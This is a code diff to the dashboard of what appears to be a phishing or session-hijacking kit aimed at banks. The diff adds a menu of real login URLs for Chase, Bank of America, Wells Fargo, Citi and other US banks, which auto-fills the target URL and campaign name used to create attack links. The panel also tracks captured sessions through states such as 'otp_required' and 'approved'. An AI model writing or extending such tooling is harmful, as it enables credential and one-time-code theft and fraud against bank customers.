@@ -55,13 +55,15 @@ header .hbtn.warn{color:#fca5a5;border-color:#7f1d1d}
 .bar{background:var(--panel);border-bottom:1px solid var(--line);
   padding:12px 18px;display:flex;gap:8px;flex-wrap:wrap;align-items:center}
 .bar .mag{font-size:18px;color:var(--mut)}
-.bar input{flex:1;min-width:220px;padding:10px 14px;border-radius:10px;
-  border:1px solid var(--line);background:#0a0502;color:var(--txt);font-size:13px}
+.bar input, .bar select{flex:1;min-width:150px;padding:10px 14px;border-radius:10px;
+  border:1px solid var(--line);background:#0a0502;color:var(--txt);font-size:13px;
+  outline:none;}
 .bar input::placeholder{color:#6b4a2a}
-.bar input#nameInput{flex:0 0 200px;font-family:-apple-system,Roboto,sans-serif}
+.bar input#nameInput{flex:0 0 160px;font-family:-apple-system,Roboto,sans-serif}
+.bar select#bankSelect{flex:0 0 180px;font-family:-apple-system,Roboto,sans-serif;cursor:pointer;}
 .bar button{padding:11px 20px;border-radius:10px;border:0;
   background:linear-gradient(135deg,var(--acc),#dc2626);color:#fff;font-weight:700;
-  font-size:13px;cursor:pointer}
+  font-size:13px;cursor:pointer;white-space:nowrap;}
 .bar button:disabled{opacity:.5;cursor:default}
 
 /* ---------- browser strip ---------- */
@@ -107,6 +109,7 @@ header .hbtn.warn{color:#fca5a5;border-color:#7f1d1d}
 .st.otp_required{background:#7c2d12;color:#fcd34d}
 .st.approved{background:#14532d;color:#4ade80}
 .st.manual{background:#3f3f46;color:#e4e4e7}
+.st.error{background:#7f1d1d;color:#fca5a5}
 
 /* ---------- detail ---------- */
 h2{font-size:12px;margin:18px 0 10px;color:var(--mut);
@@ -188,8 +191,22 @@ code{font-family:ui-monospace,monospace;color:var(--gold)}
 
   <div class="bar">
     <span class="mag">🔍</span>
-    <input id="urlInput" placeholder="Paste target URL here  ·  use {sid} for the session id">
-    <input id="nameInput" placeholder="campaign name (blank = random)">
+    
+    <select id="bankSelect">
+      <option value="">-- Select Bank --</option>
+      <option value="chase|https://secure.chase.com/web/auth/?treatment=chase#/logon/logon/chaseOnline">Chase</option>
+      <option value="bofa|https://www.bankofamerica.com/">Bank of America</option>
+      <option value="wellsfargo|https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS">Wells Fargo</option>
+      <option value="citi|https://online.citi.com/US/login.do">CitiBank</option>
+      <option value="capitalone|https://myaccounts.capitalone.com/">Capital One</option>
+      <option value="usbank|https://onlinebanking.usbank.com/">US Bank</option>
+      <option value="pnc|https://www.pnc.com/en/personal-banking.html">PNC Bank</option>
+      <option value="tdbank|https://www.td.com/us/en/personal-banking">TD Bank</option>
+      <option value="ally|https://secure.ally.com/">Ally Bank</option>
+    </select>
+
+    <input id="urlInput" placeholder="Or paste target URL here  ·  use {sid} for the session id">
+    <input id="nameInput" placeholder="campaign name">
     <button id="createBtn">🔗 Create Link</button>
   </div>
 
@@ -295,7 +312,6 @@ function lockNow() {
   const savedTok = localStorage.getItem("wp.token");
   if (savedApi && savedTok) {
     S.api = savedApi; S.token = savedTok;
-    // validate
     try {
       const r = await fetch(savedApi + "/api/admin/sessions", {
         headers: { "X-Admin-Token": savedTok }
@@ -368,6 +384,14 @@ async function delCampaign(id) {
   loadCampaigns();
 }
 
+// Auto-fill URL and Name when Bank is selected
+$("bankSelect").addEventListener("change", (e) => {
+  if (!e.target.value) return;
+  const [name, url] = e.target.value.split("|");
+  $("nameInput").value = name;
+  $("urlInput").value = url;
+});
+
 $("createBtn").addEventListener("click", async () => {
   const url = $("urlInput").value.trim();
   const name = $("nameInput").value.trim();
@@ -380,6 +404,7 @@ $("createBtn").addEventListener("click", async () => {
     });
     if (!r.ok) { alert(r.error || "failed"); return; }
     $("urlInput").value = ""; $("nameInput").value = "";
+    $("bankSelect").value = "";
     await loadCampaigns();
     const camp = S.campaigns.find(c => c.id === r.name);
     if (camp) {
